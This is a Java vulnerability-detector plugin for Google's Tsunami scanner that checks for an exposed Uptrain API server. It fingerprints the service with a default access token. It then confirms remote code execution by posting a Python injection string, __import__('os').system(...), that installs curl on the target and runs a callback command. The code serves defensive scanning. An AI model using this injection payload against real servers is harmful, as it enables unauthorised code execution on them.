/*
 * Copyright 2025 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.google.tsunami.plugins.detectors.rce;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.common.net.HttpHeaders.CONTENT_TYPE;
import static com.google.common.net.HttpHeaders.USER_AGENT;
import static com.google.tsunami.common.net.http.HttpRequest.get;
import static com.google.tsunami.common.net.http.HttpRequest.post;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.common.util.concurrent.Uninterruptibles;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpStatus;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.ForWebService;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.NotImplementedException;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.plugins.detectors.rce.UptrainExposedApiDetectorAnnotations.UptrainExposedApiOobSleepDuration;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.PayloadGeneratorConfig;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Duration;
import java.time.Instant;
import java.util.Objects;
import javax.inject.Inject;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import okio.Buffer;
import org.jspecify.annotations.Nullable;

/** A {@link VulnDetector} that detects the exposed uptrain api server. */
@ForWebService
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "UptrainExposedApiVulnDetector",
    version = "0.1",
    description = "This detector checks for an exposed Uptrain API",
    author = "lancedD00m",
    bootstrapModule = UptrainExposedApiDetectorBootstrapModule.class)
public class UptrainExposedApiDetector implements VulnDetector {

  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  private final PayloadGenerator payloadGenerator;

  private final HttpClient httpClient;
  private final Clock utcClock;
  private final int oobSleepDuration;

  @Inject
  UptrainExposedApiDetector(
      HttpClient httpClient,
      @UtcClock Clock utcClock,
      PayloadGenerator payloadGenerator,
      @UptrainExposedApiOobSleepDuration int oobSleepDuration) {
    this.httpClient = checkNotNull(httpClient);
    this.utcClock = checkNotNull(utcClock);
    this.payloadGenerator = checkNotNull(payloadGenerator);
    this.oobSleepDuration = oobSleepDuration;
  }

  @Override
  public ImmutableList<Vulnerability> getAdvisories() {
    return ImmutableList.of(
        Vulnerability.newBuilder()
            .setMainId(
                VulnerabilityId.newBuilder()
                    .setPublisher("TSUNAMI_COMMUNITY")
                    .setValue("UptrainExposedApi"))
            .setSeverity(Severity.CRITICAL)
            .setTitle("Exposed Uptrain API Server")
            .setDescription(
                "An exposed Uptrain API server can be exploited by attackers to create a"
                    + " project with malicious AI Model. This can lead to remote code execution"
                    + " on the server.")
            .setRecommendation(
                "Set proper authentication for the Uptrain API server and "
                    + "ensure the API is not publicly exposed through a "
                    + "misconfigured reverse proxy.")
            .build());
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("UptrainExposedApiDetector starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(this::isUptrainWebApplication)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isUptrainWebApplication(NetworkService networkService) {
    try {
      String projectRunsUrl =
          NetworkServiceUtils.buildWebApplicationRootUrl(networkService)
              + "api/public/project_runs";
      HttpResponse httpResponse =
          httpClient.send(
              get(projectRunsUrl)
                  .setHeaders(
                      HttpHeaders.builder().addHeader(USER_AGENT, "TSUNAMI_SCANNER").build())
                  .build(),
              networkService);
      if (httpResponse.status() != HttpStatus.FORBIDDEN
          && httpResponse.bodyString().isEmpty()
          && !httpResponse.bodyString().get().equals("{\"detail\":\"Unspecified API key\"}")) {
        return false;
      }
      // send an authenticated request to the API to check if it's uptrain
      httpResponse =
          httpClient.send(
              get(projectRunsUrl)
                  .setHeaders(
                      HttpHeaders.builder()
                          .addHeader(USER_AGENT, "TSUNAMI_SCANNER")
                          .addHeader("uptrain-access-token", "default_key")
                          .build())
                  .build(),
              networkService);
      return httpResponse.status() == HttpStatus.UNPROCESSABLE_ENTITY
          && httpResponse.bodyString().isPresent()
          && httpResponse
              .bodyString()
              .get()
              .equals(
                  "{\"detail\":[{\"type\":\"missing\",\"loc\""
                      + ":[\"query\",\"project_id\"],\"msg\":\"Field required\",\"input\":null}]}");

    } catch (RuntimeException | IOException e) {
      logger.atWarning().withCause(e).log(
          "Request to target %s failed",
          NetworkServiceUtils.buildWebApplicationRootUrl(networkService));
      return false;
    }
  }

  private boolean isServiceVulnerable(NetworkService networkService) {

    String targetVulnerabilityUrl =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService)
            + "api/public/create_project";

    var payload = getTsunamiCallbackHttpPayload();
    if (payload == null || !payload.getPayloadAttributes().getUsesCallbackServer()) {
      logger.atWarning().log(
          "The Tsunami callback server is not setup for this environment, so we cannot confirm the"
              + " RCE callback");
      return false;
    }
    String cmd = payload.getPayload();

    try {

      MultipartBody mBody =
          new MultipartBody.Builder()
              .setType(MultipartBody.FORM)
              .addFormDataPart("model", "gpt-3.5-turbo")
              .addFormDataPart("project_name", "asdf")
              .addFormDataPart(
                  "checks",
                  String.format(
                      "__import__('os').system('apt update && apt install curl -y && %s')", cmd))
              .addFormDataPart("dataset_name", "asdf")
              .addFormDataPart("metadata", "{\"gpt-3.5-turbo\":{\"openai_api_key\":\"asdf\"}}")
              .addFormDataPart(
                  "data_file",
                  "test.jsonl",
                  RequestBody.create(MediaType.parse("application/octet-stream"), "\\r\\n"))
              .addFormDataPart("edit", "Upload and import")
              .build();

      Buffer sink = new Buffer();
      mBody.writeTo(sink);

      HttpResponse httpResponse =
          httpClient.send(
              post(targetVulnerabilityUrl)
                  .setHeaders(
                      HttpHeaders.builder()
                          .addHeader(
                              CONTENT_TYPE, Objects.requireNonNull(mBody.contentType()).toString())
                          .addHeader("uptrain-access-token", "default_key")
                          .addHeader(USER_AGENT, "TSUNAMI_SCANNER")
                          .build())
                  .setRequestBody(ByteString.copyFrom(sink.readByteArray()))
                  .build(),
              networkService);
      if (httpResponse.status() != HttpStatus.INTERNAL_SERVER_ERROR) {
        // in case of success exploitation, the server will return 500
        return false;
      }
    } catch (RuntimeException | IOException e) {
      logger.atWarning().withCause(e).log("Request to target %s failed", targetVulnerabilityUrl);
      return false;
    }

    // If there is an RCE, the execution isn't immediate
    logger.atInfo().log("Waiting for RCE callback.");
    Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(oobSleepDuration));
    if (payload.checkIfExecuted()) {
      logger.atInfo().log("RCE payload executed!");
      return true;
    }
    return false;
  }

  private @Nullable Payload getTsunamiCallbackHttpPayload() {
    try {
      return this.payloadGenerator.generate(
          PayloadGeneratorConfig.newBuilder()
              .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.BLIND_RCE)
              .setInterpretationEnvironment(
                  PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
              .setExecutionEnvironment(
                  PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
              .build());
    } catch (NotImplementedException n) {
      return null;
    }
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(this.getAdvisories().getFirst())
        .build();
  }
}
